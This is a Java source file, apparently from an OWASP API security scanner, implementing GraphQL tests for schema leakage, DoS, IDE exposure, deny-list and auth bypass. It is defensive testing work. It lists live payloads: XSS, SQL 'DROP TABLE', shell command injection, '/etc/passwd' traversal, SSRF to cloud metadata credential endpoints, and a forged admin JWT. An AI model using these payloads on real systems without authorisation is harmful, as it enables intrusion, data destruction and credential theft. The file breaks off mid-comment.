package org.owasp.astf.testcases;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.owasp.astf.core.EndpointInfo;
import org.owasp.astf.core.http.HttpClient;
import org.owasp.astf.core.http.HttpResponse;
import org.owasp.astf.core.result.Finding;
import org.owasp.astf.core.result.Severity;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * Security tests for GraphQL APIs.
 *
 * <p>GraphQL endpoints expose a rich query language that can be abused in ways
 * REST APIs cannot.  This test case covers the most critical GraphQL-specific
 * attack surfaces:</p>
 *
 * <ul>
 *   <li><b>Introspection enabled in production</b> — reveals the full schema,
 *       making it trivial for attackers to enumerate all types, queries, and
 *       mutations.</li>
 *   <li><b>Field suggestion leakage</b> — when introspection is disabled but
 *       the server still returns "Did you mean…" hints, schema enumeration is
 *       still possible.</li>
 *   <li><b>Query depth attack</b> — deeply nested queries can exhaust server
 *       resources (DoS); lack of depth limiting is a common misconfiguration.</li>
 *   <li><b>Batch query attack</b> — sending an array of operations in a single
 *       HTTP request is a common technique to bypass rate-limiting controls.</li>
 *   <li><b>GraphQL endpoint discovery</b> — detects commonly-used paths when
 *       no explicit endpoint is provided.</li>
 * </ul>
 *
 * <p>The test case ID follows the framework's naming convention.  Because GraphQL
 * is a cross-cutting concern, vulnerabilities may be mapped to multiple OWASP
 * API Security Top 10 categories (API3, API4, API8).</p>
 */
public class GraphQLSecurityTestCase implements TestCase {
    private static final Logger logger = LogManager.getLogger(GraphQLSecurityTestCase.class);

    static final String TEST_CASE_ID = "ASTF-GRAPHQL-2023";

    // Common GraphQL endpoint paths to probe during discovery
    private static final List<String> GRAPHQL_PATHS = List.of(
            "/graphql",
            "/api/graphql",
            "/gql",
            "/graphiql",
            "/graphql/console",
            "/query",
            "/api/query"
    );

    // GraphQL IDE/explorer interfaces — never meant to be reachable in production, since they
    // expose the full schema and a live query console to anyone who finds the path.
    private static final List<String> GRAPHQL_IDE_PATHS = List.of(
            "/graphiql", "/graphql-playground", "/playground", "/altair", "/voyager", "/graphql/console"
    );

    // A guessed cookie some targets use to gate an otherwise-blocked debug/IDE interface behind —
    // client-controllable "trust" flags like this are a common, weak access-control pattern.
    private static final Map<String, String> DEBUG_COOKIE_HEADERS = Map.of("Cookie", "debug=true; isAdmin=true");

    // Keywords suggesting a query field is sensitive enough that a naive string-based deny-list
    // (checking the raw query text rather than the parsed AST) might specifically target it —
    // and therefore a good candidate for testing whether wrapping it in a fragment bypasses that
    // deny-list (since a text-matching filter looking for "fieldName(" won't see it once it's
    // referenced only via "...FragmentName").
    private static final List<String> SENSITIVE_FIELD_KEYWORDS = List.of(
            "admin", "debug", "diagnostic", "system", "internal", "secret", "config"
    );

    // Query fields commonly used to fetch the current authenticated user — the natural target
    // for testing whether auth can be bypassed by passing a token as a query ARGUMENT rather
    // than (or in addition to) the Authorization header.
    private static final List<String> CURRENT_USER_FIELD_NAMES = List.of("me", "viewer", "currentUser", "profile");

    // JWT with "none" algorithm, claiming an admin subject — the same forged-token technique
    // BrokenAuthenticationTestCase uses for header-based bypass, reused here as a query argument.
    private static final String NONE_ALG_JWT_ARG =
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0" +
            ".eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIn0" +
            ".";

    // Standard introspection query — smallest form that reveals the full schema
    private static final String INTROSPECTION_QUERY =
            "{\"query\":\"{__schema{queryType{name}mutationType{name}types{name kind}}}\"}";

    // Field suggestion probe — requests a field that almost certainly does not exist
    // A vulnerable server replies with "Did you mean …"
    private static final String SUGGESTION_PROBE_QUERY =
            "{\"query\":\"{__typenme}\"}";   // intentional typo: __typenme

    // Deeply nested query designed to trigger resource exhaustion.
    //
    // Built from __Type.ofType — a self-referencing field that is part of the mandatory
    // introspection schema every spec-compliant GraphQL server exposes — rather than guessed
    // application field names. A query built from placeholder names like "{a{b{c{...}}}}"
    // fails schema validation (HTTP 400 "Cannot query field") on any real schema before depth
    // is ever assessed; chaining ofType always resolves to a real, deeply-nestable field.
    static final String DEEP_QUERY;
    static {
        StringBuilder chain = new StringBuilder("kind name");
        for (int i = 0; i < 12; i++) {
            chain = new StringBuilder("kind name ofType{" + chain + "}");
        }
        DEEP_QUERY = "{\"query\":\"{__schema{types{" + chain + "}}}\"}";
    }

    // Batch query — three introspection operations in one HTTP call
    private static final String BATCH_QUERY =
            "[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]";

    // A moderately expensive, always-valid selection (real schema-walking work, not a free
    // meta-field like __typename) used as the repeated unit for the field-duplication and
    // alias-based DoS probes below — chosen because it works on any schema without knowing the
    // target's own (potentially actually expensive) resolvers.
    private static final String DOS_PROBE_SELECTION = "__schema{types{name kind fields{name}}}";
    private static final int DOS_REPETITION_COUNT = 60;

    private static final long DOS_ABSOLUTE_SLOW_THRESHOLD_MS = 3000;
    private static final long DOS_BASELINE_MULTIPLIER = 8;

    // Two fragments that reference each other — a cycle the GraphQL spec requires servers to
    // reject at validation time (before execution). A server that doesn't check for this can
    // recurse indefinitely trying to resolve the cycle.
    private static final String CIRCULAR_FRAGMENT_QUERY =
            "{\"query\":\"fragment A on Query{...B} fragment B on Query{...A} query{...A}\"}";

    // Introspects mutation fields, their argument types/names, AND their own return type, so
    // injection payloads can be sent to real mutations discovered from the schema (rather than
    // guessed field names) with a request shape the resolver will actually accept.
    private static final String MUTATION_INTROSPECTION_QUERY =
            "{\"query\":\"{__schema{mutationType{fields{name " +
            "type{name kind ofType{name kind ofType{name kind}}} " +
            "args{name type{name kind ofType{name kind ofType{name kind}}}}}}}}\"}";

    // Same shape as MUTATION_INTROSPECTION_QUERY but for queryType — resolver-level injection
    // isn't unique to mutations; a query field with a string argument (e.g. DVGA's pastes(filter))
    // can just as easily concatenate it into a SQL query or shell command.
    private static final String QUERY_INTROSPECTION_QUERY =
            "{\"query\":\"{__schema{queryType{fields{name " +
            "type{name kind ofType{name kind ofType{name kind}}} " +
            "args{name type{name kind ofType{name kind ofType{name kind}}}}}}}}\"}";

    // Follow-up introspection for a named type's own fields — used to build a selection set that
    // will actually surface a mutation's reflected data, since many real-world GraphQL APIs wrap
    // mutation results in a payload/result type (e.g. "CreatePaste { paste { content } }") rather
    // than returning the affected data directly.
    private static final String TYPE_FIELDS_QUERY_TEMPLATE =
            "{\"query\":\"{__type(name:\\\"%s\\\"){fields{name type{name kind " +
            "ofType{name kind ofType{name kind}}}}}}\"}";

    private static final List<String> KNOWN_SCALAR_TYPES = List.of("String", "Int", "Float", "Boolean", "ID");

    // Injection payloads targeting resolver-level flaws (OS command injection, SQL injection,
    // stored XSS, path traversal) — DVGA-style vulnerabilities not covered by the
    // schema/protocol-level checks above.
    private static final List<String> RESOLVER_INJECTION_PAYLOADS = List.of(
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "test`whoami`test",
            "../../../etc/passwd"
    );

    private static final List<String> RESOLVER_INJECTION_INDICATORS = List.of(
            "<script>alert('xss')</script>", "root:x:0:0", "sql syntax", "syntax error near"
    );

    // Argument names suggesting the value is used to make an outbound request — the same GraphQL
    // mutation/query-argument surface as resolver injection, but tested with SSRF payloads
    // instead when the argument name looks URL/host-shaped (e.g. DVGA's importPaste(host, path)).
    private static final List<String> SSRF_LIKE_ARG_NAMES = List.of(
            "url", "uri", "host", "link", "callback", "webhook", "endpoint", "target", "path", "src"
    );

    private static final List<String> GRAPHQL_SSRF_PAYLOADS = List.of(
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/"
    );

    private static final List<String> GRAPHQL_SSRF_INDICATORS = List.of(
            "ami-id", "instance-id", "iam/security-credentials", "computemetadata", "instance/service-accounts"
    );

    private static final String CONTENT_TYPE_JSON = "application/json";
    private final ObjectMapper objectMapper = new ObjectMapper();

    @Override
    public String getId() {
        return TEST_CASE_ID;
    }

    @Override
    public String getName() {
        return "GraphQL Security";
    }

    @Override
    public String getDescription() {
        return "Tests GraphQL-specific vulnerabilities including introspection enabled in " +
               "production, field suggestion leakage, query depth attacks, and batch query abuse.";
    }

    @Override
    public List<Finding> execute(EndpointInfo endpoint, HttpClient httpClient) throws IOException {
        logger.info("Executing {} test on {}", getId(), endpoint);
        List<Finding> findings = new ArrayList<>();

        // Only test endpoints that look like GraphQL
        if (!isGraphQLEndpoint(endpoint)) {
            List<EndpointInfo> discovered = discoverGraphQLEndpoints(endpoint, httpClient);
            if (discovered.isEmpty()) {
                logger.debug("No GraphQL endpoint found at {}", endpoint.getFullUrl());
                return findings;
            }
            // Use the first discovered GraphQL endpoint for subsequent tests
            endpoint = discovered.get(0);
            logger.info("Discovered GraphQL endpoint: {}", endpoint.getFullUrl());
        }

        findings.addAll(testIntrospectionEnabled(endpoint, httpClient));
        findings.addAll(testFieldSuggestionLeakage(endpoint, httpClient));
        findings.addAll(testQueryDepthAttack(endpoint, httpClient));
        findings.addAll(testBatchQueryAbuse(endpoint, httpClient));
        findings.addAll(testResolverInjection(endpoint, httpClient));
        findings.addAll(testFieldDuplicationAttack(endpoint, httpClient));
        findings.addAll(testAliasBasedAttack(endpoint, httpClient));
        findings.addAll(testCircularFragmentAttack(endpoint, httpClient));
        findings.addAll(testGraphiQLExposure(endpoint, httpClient));
        findings.addAll(testOperationDenyListBypass(endpoint, httpClient));
        findings.addAll(testArgumentBasedAuthBypass(endpoint, httpClient));

        return findings;
    }

    // ── Helper: is this endpoint a GraphQL endpoint? ──────────────────────────

    /**
     * GraphQL servers return HTTP 200 for both successful queries AND validation/execution
     * errors — per spec, errors are reported in the response body's {@code "errors"} array,
     * never via HTTP status. A 2xx status therefore does not by itself prove a query was
     * accepted; the body must also contain real {@code "data"} and be free of an
     * {@code "errors"} entry (e.g. a depth-limit or schema-validation rejection).
     */
    boolean isAcceptedGraphQLQuery(HttpResponse response) {
        if (response == null || !response.isSuccess()) {
            return false;
        }
        String body = response.getBody();
        if (body == null || body.isBlank() || !body.contains("\"data\"")) {
            return false;
        }
        return !body.contains("\"errors\"");
    }

    boolean isGraphQLEndpoint(EndpointInfo endpoint) {
        String path = endpoint.getPath().toLowerCase();
        return GRAPHQL_PATHS.stream().anyMatch(path::endsWith)
                || path.contains("graphql")
                || path.contains("/gql");
    }

    // ── Discovery ─────────────────────────────────────────────────────────────

    /**
     * Probes common GraphQL paths at the base URL to discover endpoints.
     */
    List<EndpointInfo> discoverGraphQLEndpoints(EndpointInfo base, HttpClient httpClient) {
        List<EndpointInfo> found = new ArrayList<>();
        String baseUrl = base.getBaseUrl() != null ? base.getBaseUrl() : "";

        for (String path : GRAPHQL_PATHS) {
            try {
                String url = baseUrl + path;
                HttpResponse response = httpClient.postWithStatus(
                        url, Map.of(), CONTENT_TYPE_JSON, INTROSPECTION_QUERY);

                if (response != null && (response.isSuccess() || response.getStatusCode() == 400)) {
                    // 400 is acceptable — it means GraphQL is there but the query failed
                    String body = response.getBody();
                    if (body != null && (body.contains("\"data\"") || body.contains("\"errors\""))) {
                        EndpointInfo ep = new EndpointInfo(path, "POST");
                        ep.setBaseUrl(baseUrl);
                        found.add(ep);
                        logger.info("Discovered GraphQL endpoint at: {}", url);
                        break; // one is enough
                    }
                }
            } catch (Exception e) {
                logger.debug("No GraphQL at {}: {}", path, e.getMessage());
            }
        }
        return found;
    }

    // ── Test 1: Introspection ─────────────────────────────────────────────────

    /**
     * Sends a full introspection query.  A 2xx response whose body contains
     * "__schema" indicates introspection is enabled, exposing the full API schema.
     */
    List<Finding> testIntrospectionEnabled(EndpointInfo endpoint, HttpClient httpClient) {
        List<Finding> findings = new ArrayList<>();
        try {
            HttpResponse response = httpClient.postWithStatus(
                    endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, INTROSPECTION_QUERY);

            if (isAcceptedGraphQLQuery(response)) {
                String body = response.getBody();
                // "queryType" only appears in a genuine introspection result (it's a field we
                // explicitly requested) — unlike a bare "__schema" substring check, it can't be
                // accidentally matched by an error message such as
                // `"Cannot query field \"__schema\" on type \"Query\"."` when introspection is disabled.
                if (body != null && body.contains("queryType")) {
                    Finding f = new Finding(
                            UUID.randomUUID().toString(),
                            "GraphQL Introspection Enabled in Production",
                            "The GraphQL API allows full schema introspection. Attackers can enumerate " +
                            "all types, queries, mutations, and their arguments, greatly reducing the " +
                            "effort needed to discover attack surfaces.",
                            Severity.MEDIUM,
                            getId(),
                            "POST " + endpoint.getPath(),
                            "Disable introspection in production environments. In Apollo Server, set " +
                            "'introspection: false'. In other frameworks, use schema directives or " +
                            "middleware to block __schema and __type queries."
                    );
                    f.setEvidence("Introspection response contained '__schema' key");
                    f.setResponseDetails("HTTP " + response.getStatusCode());
                    findings.add(f);
                    logger.info("GraphQL introspection is enabled at {}", endpoint.getFullUrl());
                }
            }
        } catch (Exception e) {
            logger.debug("Error testing GraphQL introspection on {}: {}", endpoint, e.getMessage());
        }
        return findings;
    }

    // ── Test 2: Field suggestion leakage ─────────────────────────────────────

    /**
     * Sends a query with a misspelled field name.  If the response contains
     * "Did you mean" the server is leaking schema information even without
     * full introspection.
     */
    List<Finding> testFieldSuggestionLeakage(EndpointInfo endpoint, HttpClient httpClient) {
        List<Finding> findings = new ArrayList<>();
        try {
            HttpResponse response = httpClient.postWithStatus(
                    endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, SUGGESTION_PROBE_QUERY);

            if (response != null) {
                String body = response.getBody();
                if (body != null && body.toLowerCase().contains("did you mean")) {
                    Finding f = new Finding(
                            UUID.randomUUID().toString(),
                            "GraphQL Field Suggestion Leakage",
                            "The GraphQL API returns field suggestions ('Did you mean…') for " +
                            "misspelled field names. Even without introspection, attackers can " +
                            "enumerate schema fields through repeated suggestion queries.",
                            Severity.LOW,
                            getId(),
                            "POST " + endpoint.getPath(),
                            "Disable field suggestions in production. In Apollo Server 3+, set " +
                            "'fieldSuggestions: false'. Consider using a schema validation middleware " +
                            "that rejects unknown fields silently."
                    );
                    f.setEvidence("Response contained 'Did you mean' for probe field '__typenme'");
                    findings.add(f);
                }
            }
        } catch (Exception e) {
            logger.debug("Error testing GraphQL field suggestions on {}: {}", endpoint, e.getMessage());
        }
        return findings;
    }

    // ── Test 3: Query depth attack ────────────────────────────────────────────

    /**
     * Sends a deeply nested query.  If the server returns 2xx, it may lack
     * query depth limiting, making it susceptible to resource-exhaustion attacks.
     */
    List<Finding> testQueryDepthAttack(EndpointInfo endpoint, HttpClient httpClient) {
        List<Finding> findings = new ArrayList<>();
        try {
            HttpResponse response = httpClient.postWithStatus(
                    endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, DEEP_QUERY);

            if (isAcceptedGraphQLQuery(response)) {
                // The server resolved the deeply nested query (real "data", no "errors") instead
                // of rejecting it — depth limiting is not enforced.
                Finding f = new Finding(
                        UUID.randomUUID().toString(),
                        "GraphQL Query Depth Limit Not Enforced",
                        "The GraphQL API accepted a deeply nested query (depth > 10) without " +
                        "rejecting it. Attackers can craft arbitrarily deep queries to exhaust " +
                        "server resources (CPU, memory) causing denial of service.",
                        Severity.MEDIUM,
                        getId(),
                        "POST " + endpoint.getPath(),
                        "Implement query depth limiting. Libraries: graphql-depth-limit (Node.js), " +
                        "graphene-django (Python), or graphql-java's MaxQueryDepthInstrumentation. " +
                        "Recommended maximum depth: 5-10 levels."
                );
                f.setEvidence("Server returned HTTP " + response.getStatusCode() +
                        " with resolved data (no errors) for a query nested 12+ levels deep via __Type.ofType");
                findings.add(f);
            }
        } catch (Exception e) {
            logger.debug("Error testing GraphQL depth on {}: {}", endpoint, e.getMessage());
        }
        return findings;
    }

    // ── Test 4: Batch query abuse ─────────────────────────────────────────────

    /**
     * Sends a batch of three queries in a single HTTP request.  If the server
     * returns an array response, batching is enabled and per-request rate limits
     * can be trivially bypassed.
     */
    List<Finding> testBatchQueryAbuse(EndpointInfo endpoint, HttpClient httpClient) {
        List<Finding> findings = new ArrayList<>();
        try {
            HttpResponse response = httpClient.postWithStatus(
                    endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, BATCH_QUERY);

            if (response != null && response.isSuccess()) {
                String body = response.getBody();
                // A batch response is a JSON array containing multiple data/errors objects
                if (body != null && body.trim().startsWith("[")) {
                    Finding f = new Finding(
                            UUID.randomUUID().toString(),
                            "GraphQL Batch Query Abuse Possible",
                            "The GraphQL API supports query batching (array of operations in a " +
                            "single HTTP request). Attackers can use batching to bypass per-request " +
                            "rate limiting by bundling many operations into one HTTP call.",
                            Severity.LOW,
                            getId(),
                            "POST " + endpoint.getPath(),
                            "If batching is not required by your clients, disable it. If batching " +
                            "is needed, apply operation-level rate limiting rather than (or in " +
                            "addition to) per-HTTP-request rate limiting."
                    );
                    f.setEvidence("Server returned a JSON array response to a batched GraphQL request");
                    findings.add(f);
                }
            }
        } catch (Exception e) {
            logger.debug("Error testing GraphQL batch queries on {}: {}", endpoint, e.getMessage());
        }
        return findings;
    }

    // ── Test: field duplication / alias-based / circular-fragment DoS ────────

    /**
     * Repeats an identical, moderately expensive selection {@link #DOS_REPETITION_COUNT} times
     * within a single query and compares its response time against a single-copy baseline. A
     * server without duplicate-selection protection may re-execute the underlying resolver once
     * per repetition rather than merging them, making response time scale with repetition count.
     */
    List<Finding> testFieldDuplicationAttack(EndpointInfo endpoint, HttpClient httpClient) {
        List<Finding> findings = new ArrayList<>();
        try {
            String baselineQuery = "{\"query\":\"{" + DOS_PROBE_SELECTION + "}\"}";
            long baselineStart = System.currentTimeMillis();
            HttpResponse baseline = httpClient.postWithStatus(
                    endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, baselineQuery);
            long baselineElapsed = System.currentTimeMillis() - baselineStart;
            if (!isAcceptedGraphQLQuery(baseline)) {
                return findings;
            }

            StringBuilder repeated = new StringBuilder("{\"query\":\"{");
            for (int i = 0; i < DOS_REPETITION_COUNT; i++) {
                repeated.append(DOS_PROBE_SELECTION).append(" ");
            }
            repeated.append("}\"}");

            boolean timedOut = false;
            long start = System.currentTimeMillis();
            try {
                httpClient.postWithStatus(endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, repeated.toString());
            } catch (IOException e) {
                timedOut = true;
            }
            long elapsed = System.currentTimeMillis() - start;
            long threshold = Math.max(DOS_ABSOLUTE_SLOW_THRESHOLD_MS, baselineElapsed * DOS_BASELINE_MULTIPLIER);

            if (timedOut || elapsed > threshold) {
                Finding f = new Finding(
                        UUID.randomUUID().toString(),
                        "GraphQL Field Duplication Denial of Service",
                        String.format("Repeating the same selection %d times in a single query took %s " +
                                "versus a %dms single-copy baseline, indicating the server re-executes the " +
                                "underlying resolver once per repetition instead of de-duplicating identical " +
                                "selections before execution.",
                                DOS_REPETITION_COUNT, timedOut ? "longer than the connection timeout" : elapsed + "ms",
                                baselineElapsed),
                        Severity.MEDIUM,
                        getId(),
                        "POST " + endpoint.getPath(),
                        "Impose a maximum query cost/complexity limit (counting repeated selections), or " +
                        "de-duplicate identical field selections before execution."
                );
                f.setEvidence(timedOut
                        ? "Request timed out (baseline: " + baselineElapsed + "ms)"
                        : "Response took " + elapsed + "ms for " + DOS_REPETITION_COUNT +
                          " repetitions (baseline: " + baselineElapsed + "ms)");
                findings.add(f);
            }
        } catch (Exception e) {
            logger.debug("Error testing GraphQL field duplication on {}: {}", endpoint, e.getMessage());
        }
        return findings;
    }

    /**
     * Same technique as {@link #testFieldDuplicationAttack}, but each repetition is given a
     * unique alias — bypassing any protection that only de-duplicates identical (non-aliased)
     * field selections, since aliased selections are never considered "the same field" for
     * merging purposes even when they're otherwise identical.
     */
    List<Finding> testAliasBasedAttack(EndpointInfo endpoint, HttpClient httpClient) {
        List<Finding> findings = new ArrayList<>();
        try {
            String baselineQuery = "{\"query\":\"{a0:" + DOS_PROBE_SELECTION + "}\"}";
            long baselineStart = System.currentTimeMillis();
            HttpResponse baseline = httpClient.postWithStatus(
                    endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, baselineQuery);
            long baselineElapsed = System.currentTimeMillis() - baselineStart;
            if (!isAcceptedGraphQLQuery(baseline)) {
                return findings;
            }

            StringBuilder aliased = new StringBuilder("{\"query\":\"{");
            for (int i = 0; i < DOS_REPETITION_COUNT; i++) {
                aliased.append("a").append(i).append(":").append(DOS_PROBE_SELECTION).append(" ");
            }
            aliased.append("}\"}");

            boolean timedOut = false;
            long start = System.currentTimeMillis();
            try {
                httpClient.postWithStatus(endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, aliased.toString());
            } catch (IOException e) {
                timedOut = true;
            }
            long elapsed = System.currentTimeMillis() - start;
            long threshold = Math.max(DOS_ABSOLUTE_SLOW_THRESHOLD_MS, baselineElapsed * DOS_BASELINE_MULTIPLIER);

            if (timedOut || elapsed > threshold) {
                Finding f = new Finding(
                        UUID.randomUUID().toString(),
                        "GraphQL Alias-Based Denial of Service",
                        String.format("Requesting the same expensive selection %d times under distinct " +
                                "aliases in a single query took %s versus a %dms single-alias baseline. " +
                                "Aliases bypass duplicate-field detection that only matches identical, " +
                                "non-aliased selections, letting an attacker multiply resolver load far " +
                                "beyond what query-depth limiting alone would catch.",
                                DOS_REPETITION_COUNT, timedOut ? "longer than the connection timeout" : elapsed + "ms",
                                baselineElapsed),
                        Severity.MEDIUM,
                        getId(),
                        "POST " + endpoint.getPath(),
                        "Impose a query cost/complexity limit that counts every aliased selection " +
                        "individually, not just unique field names."
                );
                f.setEvidence(timedOut
                        ? "Request timed out (baseline: " + baselineElapsed + "ms)"
                        : "Response took " + elapsed + "ms for " + DOS_REPETITION_COUNT +
                          " aliased repetitions (baseline: " + baselineElapsed + "ms)");
                findings.add(f);
            }
        } catch (Exception e) {
            logger.debug("Error testing GraphQL alias-based attack on {}: {}", endpoint, e.getMessage());
        }
        return findings;
    }

    /**
     * Sends two fragments that reference each other in a cycle. The GraphQL specification
     * requires servers to detect and reject fragment cycles at validation time, before
     * execution — a server that instead tries to resolve the cycle can hang or crash.
     */
    List<Finding> testCircularFragmentAttack(EndpointInfo endpoint, HttpClient httpClient) {
        List<Finding> findings = new ArrayList<>();
        try {
            boolean timedOut = false;
            long start = System.currentTimeMillis();
            HttpResponse response = null;
            try {
                response = httpClient.postWithStatus(
                        endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, CIRCULAR_FRAGMENT_QUERY);
            } catch (IOException e) {
                timedOut = true;
            }
            long elapsed = System.currentTimeMillis() - start;

            if (timedOut || elapsed > DOS_ABSOLUTE_SLOW_THRESHOLD_MS) {
                Finding f = new Finding(
                        UUID.randomUUID().toString(),
                        "GraphQL Circular Fragment Denial of Service",
                        String.format("Two mutually-referencing fragments — a cycle the GraphQL spec requires " +
                                "servers to reject at validation time — caused the response to take %s. " +
                                "A spec-compliant server rejects this instantly with a validation error; " +
                                "this server instead appears to attempt resolving the cycle.",
                                timedOut ? "longer than the connection timeout" : elapsed + "ms"),
                        Severity.HIGH,
                        getId(),
                        "POST " + endpoint.getPath(),
                        "Ensure the GraphQL server library's fragment-cycle validation is enabled (it's " +
                        "part of the GraphQL specification and enabled by default in virtually every " +
                        "compliant implementation — verify no custom validation rules have disabled it)."
                );
                f.setEvidence(timedOut ? "Request timed out" : "Response took " + elapsed + "ms");
                findings.add(f);
            } else if (response != null) {
                logger.debug("GraphQL server correctly rejected the circular fragment query on {} (HTTP {})",
                        endpoint, response.getStatusCode());
            }
        } catch (Exception e) {
            logger.debug("Error testing GraphQL circular fragment attack on {}: {}", endpoint, e.getMessage());
        }
        return findings;
    }

    // ── Test: GraphQL IDE exposure (with cookie-gated bypass check) ───────────

    /**
     * Probes for exposed GraphQL IDE/explorer interfaces (GraphiQL, Playground, Altair, Voyager),
     * which are development tools that should never be reachable in production — they expose a
     * live, schema-aware query console to anyone who finds the path. If unauthenticated access is
     * blocked, retries with a guessed "debug"/"admin" cookie: some targets gate the IDE behind a
     * client-controllable cookie rather than real authentication, and a request that succeeds only
     * with that cookie present is itself evidence of that weak gate.
     */
    List<Finding> testGraphiQLExposure(EndpointInfo endpoint, HttpClient httpClient) {
        List<Finding> findings = new ArrayList<>();
        String baseUrl = endpoint.getBaseUrl() != null ? endpoint.getBaseUrl() : "";

        for (String path : GRAPHQL_IDE_PATHS) {
            try {
                String url = baseUrl + path;
                HttpResponse response = httpClient.getWithStatus(url, Map.of());

                if (response != null && response.isSuccess() && looksLikeGraphQLIde(response.getBody())) {
                    Finding f = new Finding(
                            UUID.randomUUID().toString(),
                            "GraphQL IDE Exposed in Production",
                            String.format("A GraphQL IDE/explorer interface is publicly accessible at '%s'. " +
                                    "These developer tools expose the full schema and a live query console " +
                                    "to anyone who finds the path, and should never be reachable outside " +
                                    "development environments.", path),
                            Severity.MEDIUM,
                            getId(),
                            "GET " + path,
                            "Disable the GraphQL IDE/playground in production builds, or restrict it to " +
                            "internal networks / behind real authentication."
                    );
                    f.setEvidence("GET " + url + " returned HTTP " + response.getStatusCode() + " with IDE markup");
                    findings.add(f);
                    continue;
                }

                if (response != null && !response.isSuccess()) {
                    HttpResponse withCookie = httpClient.getWithStatus(url, DEBUG_COOKIE_HEADERS);
                    if (withCookie != null && withCookie.isSuccess() && looksLikeGraphQLIde(withCookie.getBody())) {
                        Finding f = new Finding(
                                UUID.randomUUID().toString(),
                                "GraphQL IDE Access Gated by a Guessable Cookie",
                                String.format("The GraphQL IDE at '%s' is blocked without any cookie, but " +
                                        "became accessible after sending a guessed 'debug=true; isAdmin=true' " +
                                        "cookie. Client-controllable cookies are not an access-control " +
                                        "mechanism — any client can set them.", path),
                                Severity.HIGH,
                                getId(),
                                "GET " + path,
                                "Never gate access to internal tools behind a client-supplied cookie value. " +
                                "Disable the IDE in production entirely, or require real server-side session " +
                                "authentication."
                        );
                        f.setEvidence("GET " + url + " without cookie: HTTP " + response.getStatusCode() +
                                "; with debug cookie: HTTP " + withCookie.getStatusCode());
                        findings.add(f);
                    }
                }
            } catch (Exception e) {
                logger.debug("Error probing GraphQL IDE path {} on {}: {}", path, endpoint, e.getMessage());
            }
        }

        return findings;
    }

    private boolean looksLikeGraphQLIde(String body) {
        if (body == null) return false;
        String lower = body.toLowerCase();
        return lower.contains("graphiql") || lower.contains("graphql-playground")
                || lower.contains("altair") || lower.contains("voyager");
    }

    // ── Test: operation deny-list bypass via fragment wrapping ────────────────

    /**
     * Tests whether a naive, string-matching deny-list (checking the raw query text for a
     * blocked field name, rather than parsing the AST) can be bypassed by referencing the same
     * field only through a fragment spread. Picks the first schema field whose name suggests
     * it's sensitive enough to plausibly be deny-listed, calls it directly, then calls the exact
     * same field wrapped in a fragment — if the direct call is rejected but the fragment-wrapped
     * one succeeds, that's concrete evidence of a text-based (rather than AST-based) filter.
     */
    List<Finding> testOperationDenyListBypass(EndpointInfo endpoint, HttpClient httpClient) {
        List<Finding> findings = new ArrayList<>();
        try {
            HttpResponse introspectionResponse = httpClient.postWithStatus(
                    endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, QUERY_INTROSPECTION_QUERY);
            if (!isAcceptedGraphQLQuery(introspectionResponse)) {
                return findings;
            }

            JsonNode root = objectMapper.readTree(introspectionResponse.getBody());
            JsonNode fields = root.path("data").path("__schema").path("queryType").path("fields");
            if (!fields.isArray()) {
                return findings;
            }

            String sensitiveFieldName = null;
            for (JsonNode field : fields) {
                String name = field.path("name").asText(null);
                if (name == null) continue;
                String lowerName = name.toLowerCase();
                if (SENSITIVE_FIELD_KEYWORDS.stream().anyMatch(lowerName::contains)) {
                    sensitiveFieldName = name;
                    break;
                }
            }
            if (sensitiveFieldName == null) {
                return findings;
            }

            String directQuery = "{\"query\":\"{" + sensitiveFieldName + "{__typename}}\"}";
            HttpResponse directResponse = httpClient.postWithStatus(
                    endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, directQuery);

            boolean directBlocked = directResponse == null
                    || !directResponse.isSuccess()
                    || (directResponse.getBody() != null && directResponse.getBody().toLowerCase().contains("error"));
            if (!directBlocked) {
                return findings; // not blocked directly — nothing to bypass
            }

            String fragmentField = sensitiveFieldName;
            String fragmentQuery = String.format(
                    "{\"query\":\"fragment F on Query{%s{__typename}} query{...F}\"}", fragmentField);
            HttpResponse fragmentResponse = httpClient.postWithStatus(
                    endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, fragmentQuery);

            if (isAcceptedGraphQLQuery(fragmentResponse)) {
                Finding f = new Finding(
                        UUID.randomUUID().toString(),
                        "GraphQL Deny-List Bypass via Fragment Wrapping",
                        String.format("The field '%s' is rejected when called directly, but succeeds when " +
                                "referenced only through a fragment spread ('...FragmentName'). This " +
                                "indicates the block is a text-based filter checking for the field name in " +
                                "the raw query string, rather than proper AST-based validation.",
                                sensitiveFieldName),
                        Severity.HIGH,
                        getId(),
                        "POST " + endpoint.getPath(),
                        "Enforce field-level access control in the resolver layer or via AST-based query " +
                        "validation, not by string-matching the raw query text — fragments, aliases, and " +
                        "whitespace variations all defeat text-based filters."
                );
                f.setEvidence("Direct call to " + sensitiveFieldName + " blocked; fragment-wrapped call succeeded");
                findings.add(f);
            }
        } catch (Exception e) {
            logger.debug("Error testing GraphQL deny-list bypass on {}: {}", endpoint, e.getMessage());
        }
        return findings;
    }

    // ── Test: argument-based authentication bypass ────────────────────────────

    /**
     * Tests whether authentication can be bypassed by passing a forged JWT as a query
     * ARGUMENT — e.g. {@code me(token: "...")} — rather than (or in addition to) the standard
     * Authorization header. Some GraphQL APIs accept a token argument on user-lookup fields as a
     * convenience and end up trusting it the same way as the header, without validating its
